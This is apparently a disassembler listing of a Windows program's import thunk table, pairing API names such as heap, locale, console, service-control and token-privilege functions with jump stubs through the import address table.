IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
QueryPerformanceFrequency
jmp [ QueryPerformanceFrequency@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
SuspendThread
jmp [ SuspendThread@IAT ]
Module32First
jmp [ Module32First@IAT ]
Module32Next
jmp [ Module32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
DuplicateHandle
jmp [ DuplicateHandle@IAT ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
HeapReAlloc
jmp [ HeapReAlloc@IAT ]
GetSystemTimeAsFileTime
jmp [ GetSystemTimeAsFileTime@IAT ]
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
FreeEnvironmentStringsA
jmp [ FreeEnvironmentStringsA@IAT ]
GetEnvironmentStrings
jmp [ GetEnvironmentStrings@IAT ]
FreeEnvironmentStringsW
jmp [ FreeEnvironmentStringsW@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
GetEnvironmentStringsW
jmp [ GetEnvironmentStringsW@IAT ]
SetHandleCount
jmp [ SetHandleCount@IAT ]
GetFileType
jmp [ GetFileType@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
TlsGetValue
jmp [ TlsGetValue@IAT ]
TlsAlloc
jmp [ TlsAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
TlsFree
jmp [ TlsFree@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
__imp_GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
HeapCreate
jmp [ HeapCreate@IAT ]
HeapDestroy
jmp [ HeapDestroy@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
IsValidCodePage
jmp [ IsValidCodePage@IAT ]
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
FatalAppExitA
jmp [ FatalAppExitA@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
GetConsoleCP
jmp [ GetConsoleCP@IAT ]
GetConsoleMode
jmp [ GetConsoleMode@IAT ]
LCMapStringA
jmp [ LCMapStringA@IAT ]
LCMapStringW
jmp [ LCMapStringW@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetConsoleCtrlHandler
jmp [ SetConsoleCtrlHandler@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
InitializeCriticalSectionAndSpinCount
jmp [ InitializeCriticalSectionAndSpinCount@IAT ]
GetTimeZoneInformation
jmp [ GetTimeZoneInformation@IAT ]
GetStringTypeA
jmp [ GetStringTypeA@IAT ]
GetStringTypeW
jmp [ GetStringTypeW@IAT ]
GetTimeFormatA
jmp [ GetTimeFormatA@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
EnumSystemLocalesA
jmp [ EnumSystemLocalesA@IAT ]
IsValidLocale
jmp [ IsValidLocale@IAT ]
SetStdHandle
jmp [ SetStdHandle@IAT ]
WriteConsoleA
jmp [ WriteConsoleA@IAT ]
GetConsoleOutputCP
jmp [ GetConsoleOutputCP@IAT ]
WriteConsoleW
jmp [ WriteConsoleW@IAT ]
HeapSize
jmp [ HeapSize@IAT ]
GetLocaleInfoW
jmp [ GetLocaleInfoW@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
CompareStringA
jmp [ CompareStringA@IAT ]
CompareStringW
jmp [ CompareStringW@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowPos
jmp [ SetWindowPos@IAT ]
GetDlgItem
jmp [ GetDlgItem@IAT ]
GetWindowLongA
jmp [ GetWindowLongA@IAT ]
SetWindowLongA
jmp [ SetWindowLongA@IAT ]
SendMessageA
jmp [ SendMessageA@IAT ]
AllocateAndInitializeSid
jmp [ AllocateAndInitializeSid@IAT ]
FreeSid
jmp [ FreeSid@IAT ]
CheckTokenMembership
jmp [ CheckTokenMembership@IAT ]
OpenServiceA
jmp [ OpenServiceA@IAT ]
CloseServiceHandle
jmp [ CloseServiceHandle@IAT ]
OpenProcessToken
jmp [ OpenProcessToken@IAT ]
DeleteService
jmp [ DeleteService@IAT ]
CreateServiceA
jmp [ CreateServiceA@IAT ]
StartServiceA
jmp [ StartServiceA@IAT ]
LookupPrivilegeValueA
jmp [ LookupPrivilegeValueA@IAT ]
OpenSCManagerA
jmp [ OpenSCManagerA@IAT ]
ControlService
jmp [ ControlService@IAT ]
AdjustTokenPrivileges
jmp [ AdjustTokenPrivileges@IAT ]
SHBrowseForFolderA
jmp [ SHBrowseForFolderA@IAT ]
SHGetSpecialFolderPathA
jmp [ SHGetSpecialFolderPathA@IAT ]
SHGetPathFromIDListA
jmp [ SHGetPathFromIDListA@IAT ]
